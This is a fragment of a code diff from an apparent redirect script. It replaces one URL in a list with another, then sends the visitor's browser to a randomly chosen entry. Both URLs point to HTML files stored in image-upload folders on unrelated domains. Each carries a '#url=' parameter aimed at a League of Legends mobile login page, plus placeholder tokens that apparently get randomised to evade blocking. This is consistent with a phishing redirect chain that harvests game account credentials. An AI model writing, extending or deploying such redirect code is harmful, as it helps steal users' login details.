@@ -7,7 +7,7 @@ function leleua() {
 }
 
 var urls=[
-'https://www.360tianma.com/public/upload/conf/2024/01-12/bcfde3dedbdb270019b3351bf4ea0a19.Htm?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html{nnnnnnnnnnn}{wwwwww}',
+'https://ttuu.6pian.cn/upload-img/2024/01/12/6d494513449285f8d4151fb443e1b884.html?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html{nnnnnnnnnnn}{wwwwww}',
 ];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
